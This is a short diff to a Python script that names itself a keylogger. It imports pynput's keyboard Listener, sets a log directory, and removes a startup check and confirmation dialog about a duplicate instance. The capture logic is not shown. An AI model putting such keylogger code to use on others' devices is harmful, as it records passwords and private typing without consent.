@@ -1,25 +1,7 @@
 from pynput.keyboard import Listener
 import logging
 import os
-import pyautogui as pt
-import psutil
 
-
-def is_python_running():
-    for process in psutil.process_iter(['pid', 'name']):
-        if process.info['name'] == 'Python.exe':
-            return True
-    return False
-
-
-if is_python_running():
-    pyconfirm = pt.confirm("An instance of Python is already running. Please make sure that it isn't an instance of "
-                           "the keylogger"
-                           "before starting, as it will become buggy. Do you want to start the keylogger?")
-    if pyconfirm == 'OK':
-        pass
-    else:
-        exit()
 
 log_dir = os.path.dirname(os.path.abspath(__file__))
 
